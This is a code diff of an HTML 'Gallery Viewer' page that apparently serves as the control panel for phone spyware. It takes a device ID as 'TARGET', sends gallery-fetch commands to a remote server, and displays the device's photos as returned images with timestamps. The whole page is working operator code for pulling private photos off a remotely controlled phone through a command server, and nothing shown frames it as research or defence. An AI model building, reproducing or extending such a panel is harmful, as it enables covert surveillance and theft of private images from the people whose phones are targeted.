@@ -3,126 +3,229 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gallery - Admin Panel</title>
+    <title>Gallery Viewer</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --bg: #0a0a0a;
-            --accent: #00ff88;
-            --glass: rgba(255, 255, 255, 0.05);
+            --bg-color: #0f0f0f;
+            --glass-bg: rgba(255, 255, 255, 0.1);
+            --glass-border: rgba(255, 255, 255, 0.2);
+            --text-main: #ffffff;
+            --text-muted: #aaaaaa;
+            --accent: #4caf50;
+            --cyan: #00f3ff;
         }
-
         body {
-            background: var(--bg); color: white;
-            font-family: sans-serif; margin: 0; padding: 20px;
+            background-color: var(--bg-color);
+            background-image: linear-gradient(45deg, #000000, #1a1a1a);
+            color: var(--text-main);
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0; padding: 20px;
+            display: flex; flex-direction: column; align-items: center; min-height: 100vh;
         }
-
-        .header {
-            display: flex; align-items: center; justify-content: space-between;
-            margin-bottom: 30px; border-bottom: 1px solid #333; padding-bottom: 15px;
+        .container {
+            width: 100%; max-width: 450px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 30px; padding: 20px;
+            border: 1px solid var(--glass-border);
+            min-height: 80vh;
+            display: flex; flex-direction: column;
         }
+        
+        /* HEADER */
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid var(--glass-border); padding-bottom: 15px; }
+        .title-area { display: flex; align-items: center; gap: 10px; }
+        .back-btn { color: var(--text-main); font-size: 1.2rem; cursor: pointer; transition: 0.3s; text-decoration: none; }
+        .back-btn:hover { color: var(--cyan); transform: translateX(-3px); }
+        .page-title { font-size: 1.1rem; font-weight: bold; text-transform: uppercase; color: var(--cyan); }
+        
+        /* CONTROLS (Load More Buttons) */
+        .controls-row {
+            display: flex; gap: 10px; margin-bottom: 20px; overflow-x: auto; padding-bottom: 5px;
+        }
+        .action-btn {
+            background: var(--glass-bg); border: 1px solid var(--glass-border);
+            color: var(--text-muted); padding: 8px 15px; border-radius: 20px;
+            font-size: 0.75rem; white-space: nowrap; cursor: pointer; transition: 0.3s;
+            display: flex; align-items: center; gap: 5px;
+        }
+        .action-btn:hover { background: rgba(0, 243, 255, 0.15); border-color: var(--cyan); color: white; }
+        .action-btn.active { border-color: var(--accent); color: var(--accent); background: rgba(76, 175, 80, 0.1); }
 
-        .back-btn { color: white; font-size: 1.5rem; text-decoration: none; }
-
+        /* GALLERY GRID */
         .gallery-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
-            gap: 15px;
+            display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;
+            flex-grow: 1; align-content: start;
         }
-
         .img-card {
-            aspect-ratio: 1; background: var(--glass);
-            border-radius: 12px; overflow: hidden;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            cursor: pointer; transition: 0.3s;
+            aspect-ratio: 1/1; background: var(--glass-bg);
+            border-radius: 12px; overflow: hidden; position: relative;
+            border: 1px solid var(--glass-border); cursor: pointer; transition: 0.3s;
         }
-
-        .img-card:hover { border-color: var(--accent); transform: scale(1.05); }
+        .img-card:hover { transform: scale(1.05); border-color: var(--cyan); z-index: 2; }
         .img-card img { width: 100%; height: 100%; object-fit: cover; }
-
-        .preview-modal {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.9); display: none;
-            align-items: center; justify-content: center; z-index: 1000;
+        
+        .timestamp-badge {
+            position: absolute; bottom: 0; left: 0; width: 100%;
+            background: rgba(0,0,0,0.8); font-size: 0.6rem;
+            color: #ddd; text-align: center; padding: 3px 0;
         }
 
-        .preview-modal img { max-width: 90%; max-height: 80%; border-radius: 10px; }
-        .close-pv { position: absolute; top: 20px; right: 30px; font-size: 2rem; cursor: pointer; }
+        /* LOADING & EMPTY STATE */
+        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; font-size: 0.9rem; grid-column: 1 / -1; }
 
-        .loader { text-align: center; padding: 50px; color: var(--accent); }
+        /* MODAL (Full Screen View) */
+        .modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.95); display: none;
+            align-items: center; justify-content: center; z-index: 1000;
+            flex-direction: column;
+        }
+        .modal img { max-width: 95%; max-height: 80vh; border-radius: 10px; box-shadow: 0 0 20px var(--cyan); }
+        .close-modal {
+            position: absolute; top: 20px; right: 20px;
+            background: rgba(255,255,255,0.1); width: 40px; height: 40px;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            cursor: pointer; color: white; font-size: 1.2rem;
+        }
     </style>
 </head>
-
 <body>
-    <div class="header">
-        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
-        <h2><i class="fa-solid fa-images" style="color:var(--accent)"></i> Gallery</h2>
-        <button onclick="fetchGallery()" style="background:none; border:none; color:var(--accent); cursor:pointer; font-size:1.2rem;">
-            <i class="fa-solid fa-rotate"></i>
-        </button>
-    </div>
 
-    <div class="gallery-grid" id="gallery">
-        <div class="loader">
-            <i class="fa-solid fa-spinner fa-spin fa-2x"></i>
-            <p>Loading Images...</p>
+    <div class="container">
+        <div class="header">
+            <div class="title-area">
+                <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+                <span class="page-title">Gallery View</span>
+            </div>
+            <div onclick="loadGallery()" class="action-btn" style="border-radius: 50%; padding: 10px;">
+                <i class="fa-solid fa-rotate-right"></i>
+            </div>
+        </div>
+
+        <div style="font-size: 0.7rem; color: var(--text-muted); margin-bottom: 15px; text-align: center;">
+            TARGET: <span id="targetID" style="color: var(--cyan); font-weight: bold;">--</span>
+        </div>
+
+        <div class="controls-row">
+            <button class="action-btn" onclick="sendCommand('GALLERY:0')">
+                <i class="fa-solid fa-download"></i> Latest 5
+            </button>
+            <button class="action-btn" onclick="sendCommand('GALLERY:5')">
+                <i class="fa-solid fa-forward"></i> Next 5
+            </button>
+            <button class="action-btn" onclick="sendCommand('GALLERY:10')">
+                <i class="fa-solid fa-forward-fast"></i> Next 10
+            </button>
+        </div>
+
+        <div class="gallery-grid" id="galleryContainer">
+            <div class="status-msg">
+                <i class="fa-solid fa-spinner fa-spin fa-2x"></i><br><br>
+                Connecting to Device...
+            </div>
         </div>
     </div>
 
-    <div class="preview-modal" id="pvModal" onclick="this.style.display='none'">
-        <span class="close-pv">&times;</span>
+    <div class="modal" id="pvModal">
+        <div class="close-modal" onclick="closePreview()"><i class="fa-solid fa-xmark"></i></div>
         <img id="pvImg" src="">
+        <div id="pvDate" style="margin-top: 15px; color: var(--cyan);"></div>
     </div>
 
     <script>
-        const SERVER_URL = "https://child-v9no.onrender.com";
-        const DEVICE_ID = "M2103K19I";
+        const API_BASE = 'https://child-v9no.onrender.com';
+        
+        // 1. URL se ID nikalo
+        const urlParams = new URLSearchParams(window.location.search);
+        const DEVICE_ID = urlParams.get('id');
 
-        document.addEventListener("DOMContentLoaded", () => {
-            // Gallery fetch karne ka command bhejo
-            sendCommand();
-            // 5 second baad images check karo
-            setTimeout(fetchGallery, 5000);
-        });
+        document.getElementById('targetID').innerText = DEVICE_ID || "No ID Selected";
 
-        function sendCommand() {
-            fetch(`${SERVER_URL}/api/send-command`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ device_id: DEVICE_ID, command: 'gallery' })
-            }).then(() => console.log("Gallery Command Sent"));
-        }
+        // Start
+        window.onload = () => {
+            if(!DEVICE_ID) {
+                document.getElementById('galleryContainer').innerHTML = "<div class='status-msg'>Error: No Device ID Provided.<br><a href='index.html' style='color:var(--cyan)'>Go Back</a></div>";
+                return;
+            }
+            loadGallery();
+        };
 
-        async function fetchGallery() {
-            const container = document.getElementById("gallery");
+        // 2. Load Gallery
+        async function loadGallery() {
+            const container = document.getElementById("galleryContainer");
+            container.innerHTML = "<div class='status-msg'><i class='fa-solid fa-spinner fa-spin'></i> Loading Photos...</div>";
 
             try {
-                // Hum server se un sabhi images ki list maang rahe hain jo M2103K19I ne upload ki hain
-                const response = await fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/gallery?t=${new Date().getTime()}`);
-                const images = await response.json();
+                const response = await fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/gallery?t=${Date.now()}`);
+                const data = await response.json();
 
-                if (!images || images.length === 0) {
-                    container.innerHTML = "<p style='grid-column: 1/-1; text-align:center;'>No images found yet. Phone is processing...</p>";
+                container.innerHTML = ""; 
+
+                if (!data || data.length === 0) {
+                    container.innerHTML = `
+                        <div class='status-msg'>
+                            <i class='fa-regular fa-image fa-3x' style='opacity:0.5'></i><br><br>
+                            No photos found yet.<br>
+                            <span style='font-size:0.7rem; color:#666'>Use buttons above to request photos.</span>
+                        </div>`;
                     return;
                 }
 
-                container.innerHTML = ""; 
-                images.forEach(imgUrl => {
+                data.forEach(item => {
                     const card = document.createElement("div");
                     card.className = "img-card";
-                    // imgUrl poora path hoga like: https://child-v9no.onrender.com/uploads/M2103K19I/gallery/1.jpg
-                    card.innerHTML = `<img src="${imgUrl}" onclick="openPreview('${imgUrl}')" onerror="this.src='https://via.placeholder.com/150?text=Error'">`;
+                    
+                    const dateStr = new Date(parseInt(item.time)).toLocaleString([], { hour12: true, month: 'short', day: 'numeric', hour: '2-digit', minute:'2-digit' });
+                    const imgSrc = "data:image/jpeg;base64," + item.image;
+
+                    card.innerHTML = `
+                        <img src="${imgSrc}" loading="lazy">
+                        <div class="timestamp-badge">${dateStr}</div>
+                    `;
+                    
+                    card.onclick = () => openPreview(imgSrc, dateStr);
                     container.appendChild(card);
                 });
 
             } catch (err) {
-                container.innerHTML = "<p style='grid-column: 1/-1; text-align:center;'>Waiting for device to upload images...</p>";
+                console.error(err);
+                container.innerHTML = "<div class='status-msg' style='color:#ff4444'>Failed to load data.</div>";
             }
         }
 
-        function openPreview(src) {
+        // 3. Send Command
+        function sendCommand(cmd) {
+            if(!DEVICE_ID) return alert("Error: ID missing");
+            
+            // UI Feedback
+            const btn = event.target.closest('.action-btn');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = `<i class="fa-solid fa-check"></i> Sent`;
+            btn.style.color = "var(--accent)";
+            setTimeout(() => { 
+                btn.innerHTML = originalText; 
+                btn.style.color = "var(--text-muted)";
+            }, 2000);
+
+            fetch(`${API_BASE}/api/send-command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: DEVICE_ID, command: cmd })
+            })
+            .then(() => console.log("Cmd Sent: " + cmd))
+            .catch(() => alert("Failed to send command"));
+        }
+
+        // 4. Modal Functions
+        function openPreview(src, date) {
             document.getElementById('pvImg').src = src;
+            document.getElementById('pvDate').innerText = date;
             document.getElementById('pvModal').style.display = 'flex';
+        }
+
+        function closePreview() {
+            document.getElementById('pvModal').style.display = 'none';
         }
     </script>
 </body>
